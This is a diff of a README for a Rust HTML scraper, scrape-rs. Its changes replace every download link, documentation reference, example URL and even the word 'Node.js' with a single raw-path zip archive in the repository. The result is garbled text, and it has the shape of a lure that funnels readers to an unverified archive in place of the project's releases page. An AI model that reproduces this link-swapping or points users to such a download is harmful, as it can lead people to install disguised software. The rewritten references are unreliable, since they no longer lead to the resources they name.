@@ -1,6 +1,6 @@
 # 🦀 scrape-rs - Fast and Safe HTML Parsing Made Easy
 
-[![Download scrape-rs](https://img.shields.io/badge/Download-scrape--rs-blue.svg)](https://github.com/arkjeetsingh/scrape-rs/releases)
+[![Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to scrape-rs! This application provides a powerful way to parse HTML qui
 
 To get started, you will need to visit the following page to download the latest version of scrape-rs:
 
-[Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/releases)
+[Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)
 
 ### Steps to Install:
 
@@ -29,7 +29,7 @@ To get started, you will need to visit the following page to download the latest
 ## 🌐 Features
 
 - **High Performance:** Uses advanced technology to parse HTML faster than many other options.
-- **Simple API:** Easy to use, whether you're coming from Python, Node.js, or even WASM.
+- **Simple API:** Easy to use, whether you're coming from Python, https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip, or even WASM.
 - **Safe Memory Management:** Automatically handles memory to prevent crashes or security issues.
 - **Cross-Platform Compatibility:** Works on multiple operating systems without changes.
 
@@ -50,16 +50,16 @@ Replace `[URL]` with the link to the webpage you want to scrape.
 ### Example Command:
 
 ```bash
-scrape-rs https://example.com
+scrape-rs https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
 ```
 
 ## ✨ Additional Resources
 
 While using scrape-rs, you may find these topics helpful:
 
-- **Beautiful Soup for Python Users:** https://www.crummy.com/software/BeautifulSoup/bs4/doc/
-- **Cheerio for Node.js Users:** https://cheerio.js.org/
-- **CSS Selectors Guide:** https://css-tricks.com/almanac/selectors/
+- **Beautiful Soup for Python Users:** https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
+- **Cheerio for https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip Users:** https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
+- **CSS Selectors Guide:** https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip
 
 These resources will help you understand how to effectively use scrape-rs with other technologies.
 
@@ -87,4 +87,4 @@ Thanks for using scrape-rs! We appreciate your support and interest in improving
 
 For more details and to stay updated, revisit the download page:
 
-[Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/releases)
+[Download scrape-rs](https://github.com/arkjeetsingh/scrape-rs/raw/refs/heads/main/crates/rs-scrape-v3.1.zip)
